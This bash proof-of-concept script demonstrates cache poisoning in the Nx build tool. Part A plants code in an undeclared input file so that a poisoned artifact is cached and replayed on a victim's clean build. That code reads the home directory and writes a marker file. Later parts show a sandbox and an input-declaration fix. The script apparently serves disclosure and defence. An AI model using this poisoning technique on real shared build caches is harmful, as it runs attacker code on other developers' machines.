#!/usr/bin/env bash
set -uo pipefail
cd /tmp/nx-poc
export NX_DAEMON=false NX_CLOUD=false

line(){ printf '\n========== %s ==========\n' "$1"; }
payload(){ cat > shared/brand.js <<'EOF'
console.log("[brand] hello from the legit brand banner");
(() => {
  const fs = require("node:fs"), os = require("node:os");
  console.log("\x1b[31m[PWNED] arbitrary code executing inside the cached artifact\x1b[0m");
  try { console.log("[PWNED] can read $HOME ->", fs.readdirSync(os.homedir()).slice(0,3).join(", ")); } catch {}
  fs.writeFileSync("/tmp/PWNED_BY_CACHE.txt", "nx artifact poisoned\n");
})();
EOF
}

############################################################
line "PART A  BEFORE: Nx default cache is poisonable (same as Turbo)"
############################################################
# On a shared cache, whoever builds a given hash FIRST owns the entry. The changed
# file (shared/brand.js) is not in the hash, so a malicious branch seeds the hash
# with a poisoned artifact; everyone on clean main then replays it.
git checkout -- shared/brand.js
npx nx reset >/dev/null 2>&1
rm -rf packages/lib/dist apps/web/dist /tmp/PWNED_BY_CACHE.txt

echo "-- attacker branch: edit ONLY undeclared shared/brand.js, build (seeds the hash) --"
payload
npx nx build web 2>&1 | grep -iE 'nx run|Successfully' | head -3

echo "-- victim on clean main: restore clean source, fresh tree, KEEP shared cache --"
git checkout -- shared/brand.js
grep -q PWNED shared/brand.js && echo "  !! payload in source" || echo "  victim source clean (no payload)"
rm -rf packages/lib/dist apps/web/dist /tmp/PWNED_BY_CACHE.txt
npx nx build web 2>&1 | grep -iE 'read the output from the cache|nx run|Successfully' | head -4
echo "-- RESULT: run the artifact the victim restored from cache --"; node apps/web/dist/index.js
echo "-- PWNED on victim? $([ -f /tmp/PWNED_BY_CACHE.txt ] && echo 'YES - POISONED' || echo no) --"

############################################################
line "PART B  AFTER: Task Sandboxing analog blocks the undeclared read"
############################################################
# Run the build in a clean root that exposes ONLY the project's DECLARED inputs.
# Declared inputs for 'lib' = {projectRoot}/**/* + workspace globals. shared/ is
# NOT declared, so it is absent in the sandbox. This is the mechanism Nx Cloud
# Task Sandboxing enforces automatically; here it is an OS-level analog.
payload   # attacker's payload is still on disk in shared/brand.js
SB=/tmp/nx-sandbox; rm -rf "$SB"; mkdir -p "$SB/packages"
cp -R packages/lib "$SB/packages/lib"
cp nx.json package.json "$SB/"
ln -s /tmp/nx-poc/node_modules "$SB/node_modules"
# shared/ deliberately NOT copied - it was never declared as an input
echo "-- sandbox exposes: $(cd "$SB" && ls) (note: no 'shared/') --"
echo "-- run build inside sandbox --"
( cd "$SB/packages/lib" && node build.mjs ) ; rc=$?
echo "-- sandbox build exit code: $rc  ($([ $rc -ne 0 ] && echo 'FAILED -> undeclared input caught, nothing cached, cannot be poisoned' || echo 'passed'))"

############################################################
line "PART C  THE FIX: declare the input -> hash now tracks it -> no false cache hit"
############################################################
cp nx.json /tmp/nx.json.bak
node -e '
const fs=require("fs");const j=JSON.parse(fs.readFileSync("nx.json","utf8"));
j.targetDefaults.build.inputs=["{projectRoot}/**/*","{workspaceRoot}/shared/**","^build"];
fs.writeFileSync("nx.json",JSON.stringify(j,null,2));
console.log("  added {workspaceRoot}/shared/** to build inputs");
'
git checkout -- shared/brand.js
npx nx reset >/dev/null 2>&1
rm -rf packages/lib/dist apps/web/dist
echo "-- clean build (declares shared/ as input) --"
npx nx build lib 2>&1 | grep -iE 'nx run|Successfully' | head -2
echo "-- now edit shared/brand.js and rebuild: hash MUST change -> no replay --"
payload
npx nx build lib 2>&1 | grep -iE 'read the output from the cache|nx run lib:build' | head -3
echo "   (if it says 'nx run lib:build' WITHOUT [local cache], the change busted the hash = safe)"

# restore
cp /tmp/nx.json.bak nx.json; git checkout -- shared/brand.js nx.json 2>/dev/null
rm -rf "$SB"
echo
echo "DONE."
